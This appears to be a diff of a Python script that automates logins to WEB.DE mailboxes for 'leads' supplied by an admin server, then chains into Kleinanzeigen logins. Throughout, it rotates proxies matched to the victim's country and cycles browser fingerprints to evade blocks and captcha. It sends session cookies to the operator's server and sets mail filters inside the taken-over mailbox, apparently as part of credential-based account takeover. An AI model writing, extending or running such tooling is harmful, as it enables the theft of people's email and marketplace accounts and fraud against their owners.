@@ -581,6 +1016,7 @@ def _execute_klein_orchestration_after_mail(
             error_message=f"Klein: неизвестный код {exit_kl}",
             result_source="klein_login",
         )
+    raise AfterMailHookFinished()
 
 
 def _vorue_blacklist_path() -> Path:
@@ -708,7 +1144,7 @@ def main():
     p.add_argument(
         "--klein-orchestration",
         action="store_true",
-        help="После входа в почту: compose+фильтры в том же окне, редирект на Klein, ожидание и вход Klein",
+        help="После входа: Config E-Mail с сервера + фильтры (web.de→профиль), редирект Klein, ожидание и вход Klein",
     )
     p.add_argument(
         "--combo-slot",
@@ -742,8 +1178,9 @@ def _run_main(
     klein_orchestration: bool = False,
     combo_slot: int | None = None,
 ) -> None:
-    global _RUN_PREFIX, _LOG_EMAIL
+    global _RUN_PREFIX, _LOG_EMAIL, _WEBDE_ATTEMPT_TAG
     _LOG_EMAIL = ""
+    _WEBDE_ATTEMPT_TAG = None
     _RUN_PREFIX = f"[lead:{lead_id[:10]}]"
     _log(
         "СТАРТ",
@@ -861,13 +1298,113 @@ def _run_main(
         _pf = PROXY_FILE.resolve()
     except OSError:
         _pf = PROXY_FILE
-    geo_entries = load_proxies_with_geo()
-    proxies_to_try: list = rank_proxy_configs_for_country(geo_entries, ip_country)
-    if not proxies_to_try:
-        proxies_to_try = [None]
+
+    def _env_yes(name: str, default: str) -> bool:
+        v = (os.environ.get(name) or default).strip().lower()
+        return v in ("1", "true", "yes", "on")
+
+    use_admin = _env_yes(
+        "WEBDE_PROXY_FROM_ADMIN",
+        "1" if (worker_secret or "").strip() else "0",
+    )
+    require_proxy = _env_yes("WEBDE_REQUIRE_PROXY", "0")
+
+    geo_entries: list = []
+    if use_admin and (worker_secret or "").strip():
+        raw_txt, srv_path = fetch_worker_proxy_txt(base_url, worker_secret)
+        if raw_txt is None:
+            msg = (
+                "WEBDE_PROXY_FROM_ADMIN: не удалось GET /api/worker/proxy-txt "
+                "(WORKER_SECRET, сеть или обновите сервер до версии с маршрутом)"
+            )
+            _log("ПРОКСИ", msg)
+            if require_proxy:
+                send_result(
+                    base_url,
+                    lead_id,
+                    worker_secret,
+                    "error",
+                    error_code="500",
+                    error_message=msg,
+                )
+                cleanup_login_artifacts()
+                _log("==========", "END SESSION", verbose_only=True)
+                return
+            geo_entries = load_proxies_with_geo()
+            _log("ПРОКСИ", "fallback: локальный login/proxy.txt рядом со скриптом", str(_pf))
+        else:
+            geo_entries = load_proxies_with_geo_from_text(raw_txt)
+            _log(
+                "ПРОКСИ",
+                "источник: Config → Прокси (сервер)",
+                f"путь на сервере: {srv_path or '—'} · валидных строк: {len(geo_entries)}",
+            )
+            if not geo_entries and (raw_txt or "").strip():
+                msg = (
+                    "В админке в поле прокси есть текст, но ни одна строка не распознана "
+                    "(host:port:user:pass или host:port@user:pass, см. login/.env.example)"
+                )
+                _log("ПРОКСИ", msg)
+                if require_proxy:
+                    send_result(
+                        base_url,
+                        lead_id,
+                        worker_secret,
+                        "error",
+                        error_code="500",
+                        error_message=msg,
+                    )
+                    cleanup_login_artifacts()
+                    _log("==========", "END SESSION", verbose_only=True)
+                    return
+    else:
+        geo_entries = load_proxies_with_geo()
+        _log(
+            "ПРОКСИ",
+            "источник: локальный login/proxy.txt",
+            f"WEBDE_PROXY_FROM_ADMIN=0 или нет worker secret · {_pf}",
+            verbose_only=True,
+        )
+
+    if require_proxy and not geo_entries:
+        msg = "WEBDE_REQUIRE_PROXY: нет валидных прокси — заполните и сохраните Config → Прокси"
+        _log("ПРОКСИ", msg)
+        send_result(
+            base_url,
+            lead_id,
+            worker_secret,
+            "error",
+            error_code="500",
+            error_message=msg,
+        )
+        cleanup_login_artifacts()
+        _log("==========", "END SESSION", verbose_only=True)
+        return
+
+    _ranked_px = rank_proxy_configs_with_file_line_numbers(geo_entries, ip_country)
+    if not _ranked_px:
+        proxies_to_try: list = [None]
+        proxy_line_by_queue_index: list[int] = [0]
+    else:
+        proxies_to_try = [t[0] for t in _ranked_px]
+        proxy_line_by_queue_index = [t[1] for t in _ranked_px]
+    _first_pc = proxies_to_try[0] if proxies_to_try else None
+    _first_srv = (_first_pc.get("server") if isinstance(_first_pc, dict) else None) or ""
+    if _first_srv:
+        _log(
+            "ПРОКСИ",
+            f"записей {len(geo_entries)} · первая попытка Playwright → {_first_srv}",
+            f"гео сортировка: {ip_country or '—'} · в очереди {len(proxies_to_try)}",
+        )
+    else:
+        _log(
+            "ПРОКСИ",
+            f"записей {len(geo_entries)} · Playwright без прокси (прямое подключение)",
+            f"гео: {ip_country or '—'}",
+        )
     _log(
         "ПРОКСИ",
-        f"файл {_pf.name} · записей {len(geo_entries)} · гео {ip_country or '—'} · порядок {len(proxies_to_try)}",
+        f"очередь прокси · записей {len(geo_entries)} · гео {ip_country or '—'} · слотов {len(proxies_to_try)}",
         verbose_only=True,
     )
     _pool_fp = _load_webde_fingerprints_playwright()
@@ -940,8 +1477,17 @@ def _run_main(
         headless = not has_display
     if not headless:
         _log("ВХОД", "браузер с окном (видно действия)", verbose_only=True)
-    _log("ВХОД", "запуск auth.web.de (email → капча → пароль)")
-    script_event(base_url, lead_id, worker_secret, EV_WEBDE_BROWSER)
+    if klein_orchestration:
+        _log("ВХОД", "Klein-оркестрация · фаза 1/2: почта WEB.DE (auth.web.de), затем вход на Kleinanzeigen")
+        script_event(
+            base_url,
+            lead_id,
+            worker_secret,
+            "Klein-оркестрация · фаза 1 — почта WEB.DE: браузер готов",
+        )
+    else:
+        _log("ВХОД", "запуск auth.web.de (email → капча → пароль)")
+        script_event(base_url, lead_id, worker_secret, EV_WEBDE_BROWSER)
 
     def on_push_wait_start():
         if klein_orchestration:
@@ -1067,6 +1613,19 @@ def _run_main(
         if len(proxies_to_try) > 1 and em_l:
             base_proxy_index = email_h % len(proxies_to_try)
 
+    _fp_grid_off_raw = (os.getenv("WEBDE_FP_GRID_OFFSET") or "").strip()
+    if _fp_grid_off_raw and n_fp:
+        try:
+            _fpgo = int(_fp_grid_off_raw, 10) % n_fp
+            _prev_fb = fp_base
+            fp_base = (fp_base + _fpgo) % n_fp
+            _log(
+                "ПРОКСИ",
+                f"WEBDE_FP_GRID_OFFSET={_fp_grid_off_raw} → кольцо отпечатков: fp_base {_prev_fb} → {fp_base}",
+            )
+        except ValueError:
+            _log("ПРОКСИ", f"WEBDE_FP_GRID_OFFSET={_fp_grid_off_raw!r} не число — игнор")
+
     pw_blk_init = automation_profile.get("playwright") if isinstance(automation_profile, dict) else None
     has_api_ua = isinstance(pw_blk_init, dict) and bool(
         (pw_blk_init.get("userAgent") or pw_blk_init.get("user_agent") or "").strip()
@@ -1128,6 +1687,7 @@ def _run_main(
         return max_retry_attempts is None or attempts_used < max_retry_attempts
 
     while _can_retry_more():
+        _WEBDE_ATTEMPT_TAG = None
         # Другие процессы автовхода дописали webde_vorue_blacklist.txt — подмешиваем, чтобы не брать ту же пару.
         blocked_pairs.update(load_vorue_blacklist_pairs())
         try:
@@ -1177,6 +1737,10 @@ def _run_main(
         force_pool = (attempts_used > 0) or (not has_api_ua)
         ps = (proxy_config.get("server") if proxy_config else None) or "без прокси"
         one_based = attempts_used + 1
+        _px_line = 0
+        if proxy_config and proxy_index < len(proxy_line_by_queue_index):
+            _px_line = int(proxy_line_by_queue_index[proxy_index])
+        _WEBDE_ATTEMPT_TAG = f"web.de {fingerprint_index} | {_px_line} | {one_based}/{_attempts_cap_str}"
 
         if attempts_used == 0:
             if has_api_ua and not force_pool:
@@ -1193,20 +1757,38 @@ def _run_main(
                     f"прокси={ps}; пул fp_index={fingerprint_index}; шаг s={s}",
                     verbose_only=True,
                 )
-            _log("ПРОКСИ", f"попытка {one_based}/{_attempts_cap_str} · {ps} · fp_pool_index={fingerprint_index}")
+            _log("ПРОКСИ", f"попытка входа · {ps} · fp_pool={fingerprint_index} · proxy.txt строка={_px_line}")
         else:
             _log(
                 "ПРОКСИ",
-                f"попытка {one_based}/{_attempts_cap_str} · прокси #{proxy_index + 1}/{n_proxy} · fp #{fingerprint_index}",
+                f"попытка входа · {ps} · fp_pool={fingerprint_index} · proxy.txt строка={_px_line}",
                 ps[:120],
             )
 
-        script_event(
-            base_url,
-            lead_id,
-            worker_secret,
-            f"WEB.DE: попытка входа · №{one_based} из {_attempts_cap_str}",
+        evt_attempt = (
+            f"Klein-оркестрация · фаза 1 — почта: попытка входа · №{one_based} из {_attempts_cap_str}"
+            if klein_orchestration
+            else f"WEB.DE: попытка входа · №{one_based} из {_attempts_cap_str}"
         )
+        script_event(base_url, lead_id, worker_secret, evt_attempt)
+
+        def _standard_after_mail_hook():
+            """После входа в почту: Config E-Mail с сервера → web.de → фильтры → закрыть браузер."""
+            script_event(base_url, lead_id, worker_secret, EV_WEBDE_MAIL_OPENED)
+            sess = take_lead_held_browser_session()
+            if not sess:
+                _log("ПОЧТА", "нет удержанной сессии — пропуск письма/фильтров")
+                return
+            browser = sess.get("browser")
+            context = sess.get("context")
+            page = sess.get("page")
+            if not browser or not context or not page:
+                _close_browser_keep_open_optional(browser, headless=headless)
+                return
+            _post_login_config_email_then_filters(
+                page, context, base_url, lead_id, worker_secret, log_step="ПОЧТА"
+            )
+            _close_browser_keep_open_optional(browser, headless=headless)
 
         def _klein_after_mail_hook():
             """Вызов в finally login_webde, пока sync_playwright() ещё открыт — иначе фильтры падают (Event loop is closed)."""
@@ -1236,8 +1818,8 @@ def _run_main(
                 lead_id=lead_id,
                 automation_profile=automation_profile,
                 force_pool_fingerprint=force_pool,
-                hold_session_after_lead_success=klein_orchestration,
-                after_mail_success_fn=_klein_after_mail_hook if klein_orchestration else None,
+                hold_session_after_lead_success=True,
+                after_mail_success_fn=_klein_after_mail_hook if klein_orchestration else _standard_after_mail_hook,
                 cookies_push={
                     "base_url": base_url,
                     "lead_id": lead_id,
@@ -1280,22 +1862,19 @@ def _run_main(
                         _log("РЕЗУЛЬТАТ", "wrong_credentials уже в API", verbose_only=True)
                     else:
                         if result == "success" and klein_orchestration:
-                            # Не путать с финальным успехом: дальше фильтры почты → API success → вход Klein (там может быть wrong_credentials).
-                            _log("РЕЗУЛЬТАТ", "success — только вход в почту WEB.DE; дальше Klein-оркестрация")
+                            _log(
+                                "РЕЗУЛЬТАТ",
+                                "success — Klein-оркестрация: Config E-Mail+фильтры → mail_ready → Klein (after_mail_success_fn)",
+                            )
+                        elif result == "success":
+                            _log("РЕЗУЛЬТАТ", "success — почта WEB.DE: Config E-Mail+фильтры, браузер закрыт")
                         else:
                             _log("РЕЗУЛЬТАТ", result)
                         if result == "push":
                             send_result(base_url, lead_id, worker_secret, result, push_timeout=True)
-                        elif result == "success" and klein_orchestration:
-                            _log(
-                                "РЕЗУЛЬТАТ",
-                                "success — Klein-оркестрация: mail_ready+ожидание email → фильтры → Klein (after_mail_success_fn)",
-                            )
-                        else:
+                        elif not (result == "success" and klein_orchestration):
                             if result == "sms":
                                 script_event(base_url, lead_id, worker_secret, EV_WEBDE_SCREEN_SMS)
-                            if result == "success":
-                                script_event(base_url, lead_id, worker_secret, EV_WEBDE_MAIL_OPENED)
                             send_result(base_url, lead_id, worker_secret, result)
                 cleanup_login_artifacts()
                 _log("==========", "END SESSION", verbose_only=True)
@@ -1316,6 +1895,10 @@ def _run_main(
                 cleanup_login_artifacts()
                 _log("==========", "END SESSION", verbose_only=True)
                 return
+        except AfterMailHookFinished:
+            cleanup_login_artifacts()
+            _log("==========", "END SESSION", verbose_only=True)
+            return
         except LoginTemporarilyUnavailable:
             why = (get_last_alert_text() or "").strip() or "блок/капча/Weiter без перехода"
             wl = why.lower()
